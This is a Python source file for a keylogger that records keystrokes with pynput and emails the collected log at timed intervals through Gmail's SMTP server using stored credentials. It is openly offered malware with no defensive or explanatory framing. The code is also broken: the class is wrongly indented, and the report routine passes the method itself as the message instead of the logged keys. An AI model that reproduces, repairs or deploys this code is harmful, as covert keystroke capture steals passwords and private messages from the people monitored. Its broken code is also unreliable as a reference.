import pynput.keyboard
import smtplib
import threading
    class keylogger:
        def __init__(self, time_interval, email, passsword):
            self.logger = "[keylogger Initiated]"
            self.subject = " keylogger Report Mail"
            self.email = email
            self.password = passsword
            self.interval = time_interval

        #maybe add some random shit

        def append_to_log(self, key_strike):
            self.logger = self.logger + key_strike

        def evaluate_keys(self, key):
            try:#this will not give an error on encountering a special character (space, tab, ctrl)
                pressed_key = str(key.char)
            except AttributeError:
                if key == key.space:#show actual space instead of key.space
                    pressed_key = " "
                else:
                    pressed_key = " " + str(key) + " "
            self.append_to_log(pressed_key)#this appends the key pressed


        def report(self):
            # print selflogger and send email of what happened
            self.send_mail(self.email, self.password, self.subject, self.report)
            self.logger = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def send_mail(self, email, password, subject, message):
            email_message = 'subject: {}\n\n{}'.format(subject, message)
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, email_message)
            server.quit()

        def start(self):
            keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()